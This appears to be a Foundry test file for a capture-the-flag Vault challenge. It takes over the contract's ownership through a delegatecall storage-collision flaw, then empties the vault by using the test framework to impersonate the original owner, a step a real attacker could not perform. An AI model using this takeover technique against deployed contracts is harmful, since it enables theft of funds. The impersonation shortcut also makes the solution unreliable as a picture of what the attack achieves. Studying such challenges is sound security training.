// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;

    VaultLogic public logic;



    address owner = address (1);

    address palyer = address (2);



    function setUp() public {

        vm.deal(owner, 1 ether);



        vm.startPrank(owner);

        logic = new VaultLogic(bytes32("0x1234"));

        vault = new Vault(address(logic));



        vault.deposite{value: 0.1 ether}();

        vm.stopPrank();

    }


    function testExploit() public {
        // 原始所有者是地址 1
        address originalOwner = owner;
        
        // 攻击者是地址 2
        address player = palyer;

        vm.deal(player, 1 ether);
        vm.startPrank(player);

        // 1. 利用 delegatecall 漏洞将 Vault 的 owner 更改为玩家
        bytes memory data = abi.encodeWithSelector(
            logic.changeOwner.selector,
            bytes32(uint256(uint160(address(logic)))), // logic 地址作为密码
            player
        );
        (bool success, ) = address(vault).call(data);
        assertTrue(success, "Delegatecall failed");
        assertEq(vault.owner(), player, "Owner was not changed");

        // 2. 作为新 owner（玩家），开启提款功能
        vault.openWithdraw();

        // 3. 停止伪装玩家，开始伪装原始所有者
        // 这是关键一步，因为只有原始所有者才有存款记录
        vm.stopPrank(); 
        vm.startPrank(originalOwner); 

        // 4. 作为原始所有者，调用 withdraw 函数取出存款
        vault.withdraw();
        
        // 5. 再次断言合约余额为 0
        assertEq(address(vault).balance, 0, "Vault balance is not 0");

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}